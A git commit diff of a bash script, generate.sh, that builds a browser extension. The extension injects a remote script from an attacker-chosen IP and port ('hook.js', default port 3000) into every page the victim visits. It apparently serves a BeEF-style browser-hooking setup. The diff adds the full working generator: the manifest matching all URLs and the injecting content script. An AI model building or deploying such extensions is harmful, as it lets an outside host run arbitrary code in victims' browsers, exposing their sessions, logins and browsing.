cab7710dfb1b70ea0235d8ecef248168b0cb4443
root <root@localhost.localdomain>
2017-02-13 20:33:33 +0100

    final generate.sh

--- generate.sh
+++ generate.sh
@@ -1,11 +1,52 @@
 #!/bin/bash
-echo -n "Your IP: "
+
+#IP
+echo -n "Your IP (Default: Current Host): "
 read hostIP
+if [ -z $hostIP ]; then
+	hostIP="$(sudo ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')"
+fi
+#portf
+echo -n "Port (Def. 3000): "
+read port
+if [ -z $port ]; then
+	port=3000
+fi
+
+
+#Extension Name
 echo -n "Extension Name: "
-read name
+
+while [ true ]
+do
+	read name
+	if [ -z $name ]; then
+		echo -n "Extension Name: "
+	else
+		break
+	fi
+done
 
 mkdir $name
 cd $name
 touch manifest.json
 touch content.js
-wget 
+
+echo '{
+  "manifest_version": 2,
+  "name": "'$name'",
+  "version": "0.1",
+  "content_scripts": [
+    {
+      "matches": [
+        "<all_urls>"
+      ],
+      "js": ["content.js"]
+    }
+  ]
+}' > manifest.json
+echo '
+var hook = document.createElement("script");
+hook.src = "http://'$hostIP':'$port'/hook.js";
+document.head.appendChild(hook);
+' > content.js
